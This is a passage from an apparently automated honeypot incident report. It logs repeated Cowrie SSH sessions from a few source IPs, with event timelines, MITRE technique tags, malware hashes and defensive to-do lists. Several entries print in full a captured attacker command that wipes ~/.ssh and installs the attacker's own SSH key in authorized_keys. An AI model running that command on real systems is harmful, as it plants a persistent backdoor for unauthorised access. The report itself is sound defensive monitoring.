| `2026-06-05 11:51:28` | `cowrie.log.closed` |
| `2026-06-05 11:51:28` | `cowrie.session.params` |
| `2026-06-05 11:51:28` | `cowrie.command.input` |
| `2026-06-05 11:51:28` | `cowrie.session.file_download` |
| `2026-06-05 11:51:28` | `cowrie.log.closed` |
| `2026-06-05 11:51:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ae66b9212e9

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-06-05 11:51 |
| **Last Seen** | 2026-06-05 11:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 11:51:29` | `cowrie.session.connect` |
| `2026-06-05 11:51:29` | `cowrie.client.version` |
| `2026-06-05 11:51:29` | `cowrie.client.kex` |
| `2026-06-05 11:51:29` | `cowrie.login.success` |
| `2026-06-05 11:51:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b69b4b6f0701

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-06-05 11:57 |
| **Last Seen** | 2026-06-05 11:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 11:57:42` | `cowrie.session.connect` |
| `2026-06-05 11:57:42` | `cowrie.client.version` |
| `2026-06-05 11:57:42` | `cowrie.client.kex` |
| `2026-06-05 11:57:42` | `cowrie.login.success` |
| `2026-06-05 11:57:42` | `cowrie.session.params` |
| `2026-06-05 11:57:42` | `cowrie.command.input` |
| `2026-06-05 11:57:42` | `cowrie.command.failed` |
| `2026-06-05 11:57:42` | `cowrie.log.closed` |
| `2026-06-05 11:57:42` | `cowrie.session.params` |
| `2026-06-05 11:57:42` | `cowrie.command.input` |
| `2026-06-05 11:57:42` | `cowrie.session.file_download` |
| `2026-06-05 11:57:42` | `cowrie.log.closed` |
| `2026-06-05 11:57:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a6c6166f2db

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-06-05 11:57 |
| **Last Seen** | 2026-06-05 11:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 11:57:43` | `cowrie.session.connect` |
| `2026-06-05 11:57:43` | `cowrie.client.version` |
| `2026-06-05 11:57:43` | `cowrie.client.kex` |
| `2026-06-05 11:57:43` | `cowrie.login.success` |
| `2026-06-05 11:57:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb43e5b3a3a4

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-06-05 11:59 |
| **Last Seen** | 2026-06-05 11:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 11:59:49` | `cowrie.session.connect` |
| `2026-06-05 11:59:49` | `cowrie.client.version` |
| `2026-06-05 11:59:49` | `cowrie.client.kex` |
| `2026-06-05 11:59:49` | `cowrie.login.success` |
| `2026-06-05 11:59:49` | `cowrie.session.params` |
| `2026-06-05 11:59:49` | `cowrie.command.input` |
| `2026-06-05 11:59:49` | `cowrie.command.failed` |
| `2026-06-05 11:59:49` | `cowrie.log.closed` |
| `2026-06-05 11:59:49` | `cowrie.session.params` |
| `2026-06-05 11:59:49` | `cowrie.command.input` |
| `2026-06-05 11:59:50` | `cowrie.session.file_download` |
| `2026-06-05 11:59:50` | `cowrie.log.closed` |
| `2026-06-05 11:59:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e5a0f56af46

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-06-05 11:59 |
| **Last Seen** | 2026-06-05 11:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 11:59:51` | `cowrie.session.connect` |
| `2026-06-05 11:59:51` | `cowrie.client.version` |
| `2026-06-05 11:59:51` | `cowrie.client.kex` |
| `2026-06-05 11:59:51` | `cowrie.login.success` |
| `2026-06-05 11:59:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e7ca6b818da

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-06-05 12:06 |
| **Last Seen** | 2026-06-05 12:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 12:06:02` | `cowrie.session.connect` |
| `2026-06-05 12:06:02` | `cowrie.client.version` |
| `2026-06-05 12:06:02` | `cowrie.client.kex` |
| `2026-06-05 12:06:02` | `cowrie.login.success` |
| `2026-06-05 12:06:03` | `cowrie.session.params` |
| `2026-06-05 12:06:03` | `cowrie.command.input` |
| `2026-06-05 12:06:03` | `cowrie.command.failed` |
| `2026-06-05 12:06:03` | `cowrie.log.closed` |
| `2026-06-05 12:06:03` | `cowrie.session.params` |
| `2026-06-05 12:06:03` | `cowrie.command.input` |
| `2026-06-05 12:06:03` | `cowrie.session.file_download` |
| `2026-06-05 12:06:03` | `cowrie.log.closed` |
| `2026-06-05 12:06:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61aa1c6a0ae8

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-06-05 12:06 |
| **Last Seen** | 2026-06-05 12:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 12:06:04` | `cowrie.session.connect` |
| `2026-06-05 12:06:04` | `cowrie.client.version` |
| `2026-06-05 12:06:04` | `cowrie.client.kex` |
| `2026-06-05 12:06:04` | `cowrie.login.success` |
| `2026-06-05 12:06:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39fa296d8acc

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-06-05 12:14 |
| **Last Seen** | 2026-06-05 12:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 12:14:27` | `cowrie.session.connect` |
| `2026-06-05 12:14:27` | `cowrie.client.version` |
| `2026-06-05 12:14:27` | `cowrie.client.kex` |
| `2026-06-05 12:14:27` | `cowrie.login.success` |
| `2026-06-05 12:14:27` | `cowrie.session.params` |
| `2026-06-05 12:14:27` | `cowrie.command.input` |
| `2026-06-05 12:14:27` | `cowrie.command.failed` |
| `2026-06-05 12:14:27` | `cowrie.log.closed` |
| `2026-06-05 12:14:27` | `cowrie.session.params` |
| `2026-06-05 12:14:27` | `cowrie.command.input` |
| `2026-06-05 12:14:27` | `cowrie.session.file_download` |
| `2026-06-05 12:14:27` | `cowrie.log.closed` |
| `2026-06-05 12:14:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-048d12ac6497

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-06-05 12:14 |
| **Last Seen** | 2026-06-05 12:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 12:14:28` | `cowrie.session.connect` |
| `2026-06-05 12:14:28` | `cowrie.client.version` |
| `2026-06-05 12:14:28` | `cowrie.client.kex` |
| `2026-06-05 12:14:28` | `cowrie.login.success` |
| `2026-06-05 12:14:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24fd26f8703d

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-06-05 12:20 |
| **Last Seen** | 2026-06-05 12:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 12:20:44` | `cowrie.session.connect` |
| `2026-06-05 12:20:44` | `cowrie.client.version` |
| `2026-06-05 12:20:44` | `cowrie.client.kex` |
| `2026-06-05 12:20:45` | `cowrie.login.success` |
| `2026-06-05 12:20:45` | `cowrie.session.params` |
| `2026-06-05 12:20:45` | `cowrie.command.input` |
| `2026-06-05 12:20:45` | `cowrie.command.failed` |
| `2026-06-05 12:20:45` | `cowrie.log.closed` |
| `2026-06-05 12:20:45` | `cowrie.session.params` |
| `2026-06-05 12:20:45` | `cowrie.command.input` |
| `2026-06-05 12:20:45` | `cowrie.session.file_download` |
| `2026-06-05 12:20:45` | `cowrie.log.closed` |
| `2026-06-05 12:20:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4c0e1ef4823

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-06-05 12:20 |
| **Last Seen** | 2026-06-05 12:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 12:20:46` | `cowrie.session.connect` |
| `2026-06-05 12:20:46` | `cowrie.client.version` |
| `2026-06-05 12:20:46` | `cowrie.client.kex` |
| `2026-06-05 12:20:46` | `cowrie.login.success` |
| `2026-06-05 12:20:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a7fac6b2d25

| Field | Detail |
|---|---|
| **Source IP** | `68.183.178[.]130` |
| **First Seen** | 2026-06-05 12:28 |
| **Last Seen** | 2026-06-05 12:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 12:28:07` | `cowrie.session.connect` |
| `2026-06-05 12:28:07` | `cowrie.client.version` |
| `2026-06-05 12:28:07` | `cowrie.client.kex` |
| `2026-06-05 12:28:08` | `cowrie.login.success` |
| `2026-06-05 12:28:08` | `cowrie.session.params` |
| `2026-06-05 12:28:08` | `cowrie.command.input` |
| `2026-06-05 12:28:08` | `cowrie.command.failed` |
| `2026-06-05 12:28:08` | `cowrie.log.closed` |
| `2026-06-05 12:28:08` | `cowrie.session.params` |
| `2026-06-05 12:28:08` | `cowrie.command.input` |
| `2026-06-05 12:28:08` | `cowrie.session.file_download` |
| `2026-06-05 12:28:08` | `cowrie.log.closed` |
| `2026-06-05 12:28:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.178[.]130` to AbuseIPDB if not already reported
- [ ] Block `68.183.178[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a19cdcd01cb

| Field | Detail |
|---|---|
| **Source IP** | `68.183.178[.]130` |
| **First Seen** | 2026-06-05 12:28 |
| **Last Seen** | 2026-06-05 12:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 12:28:10` | `cowrie.session.connect` |
| `2026-06-05 12:28:10` | `cowrie.client.version` |
| `2026-06-05 12:28:10` | `cowrie.client.kex` |
| `2026-06-05 12:28:10` | `cowrie.login.success` |
| `2026-06-05 12:28:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.178[.]130` to AbuseIPDB if not already reported
- [ ] Block `68.183.178[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfe44f268392

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-06-05 12:29 |
| **Last Seen** | 2026-06-05 12:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 12:29:08` | `cowrie.session.connect` |
| `2026-06-05 12:29:08` | `cowrie.client.version` |
| `2026-06-05 12:29:08` | `cowrie.client.kex` |
| `2026-06-05 12:29:09` | `cowrie.login.success` |
| `2026-06-05 12:29:09` | `cowrie.session.params` |
| `2026-06-05 12:29:09` | `cowrie.command.input` |
| `2026-06-05 12:29:09` | `cowrie.command.failed` |
| `2026-06-05 12:29:09` | `cowrie.log.closed` |
| `2026-06-05 12:29:09` | `cowrie.session.params` |
| `2026-06-05 12:29:09` | `cowrie.command.input` |
| `2026-06-05 12:29:09` | `cowrie.session.file_download` |
| `2026-06-05 12:29:09` | `cowrie.log.closed` |
| `2026-06-05 12:29:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16579a7af77c

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-06-05 12:29 |
| **Last Seen** | 2026-06-05 12:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 12:29:10` | `cowrie.session.connect` |
| `2026-06-05 12:29:10` | `cowrie.client.version` |
| `2026-06-05 12:29:10` | `cowrie.client.kex` |
| `2026-06-05 12:29:10` | `cowrie.login.success` |
| `2026-06-05 12:29:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d83aca32fba

| Field | Detail |
|---|---|
| **Source IP** | `41.111.178[.]165` |
| **First Seen** | 2026-06-05 12:37 |
| **Last Seen** | 2026-06-05 12:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 12:37:19` | `cowrie.session.connect` |
| `2026-06-05 12:37:19` | `cowrie.client.version` |
| `2026-06-05 12:37:19` | `cowrie.client.kex` |
| `2026-06-05 12:37:20` | `cowrie.login.success` |
| `2026-06-05 12:37:20` | `cowrie.session.params` |
| `2026-06-05 12:37:20` | `cowrie.command.input` |
| `2026-06-05 12:37:20` | `cowrie.command.failed` |
| `2026-06-05 12:37:21` | `cowrie.log.closed` |
| `2026-06-05 12:37:21` | `cowrie.session.params` |
| `2026-06-05 12:37:21` | `cowrie.command.input` |
| `2026-06-05 12:37:21` | `cowrie.session.file_download` |
| `2026-06-05 12:37:21` | `cowrie.log.closed` |
| `2026-06-05 12:37:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.111.178[.]165` to AbuseIPDB if not already reported
- [ ] Block `41.111.178[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d62ed1ddbec

| Field | Detail |
|---|---|
| **Source IP** | `41.111.178[.]165` |
| **First Seen** | 2026-06-05 12:37 |
| **Last Seen** | 2026-06-05 12:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 12:37:23` | `cowrie.session.connect` |
| `2026-06-05 12:37:23` | `cowrie.client.version` |
| `2026-06-05 12:37:23` | `cowrie.client.kex` |
| `2026-06-05 12:37:24` | `cowrie.login.success` |
| `2026-06-05 12:37:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.111.178[.]165` to AbuseIPDB if not already reported
- [ ] Block `41.111.178[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8074984191c8

| Field | Detail |
|---|---|
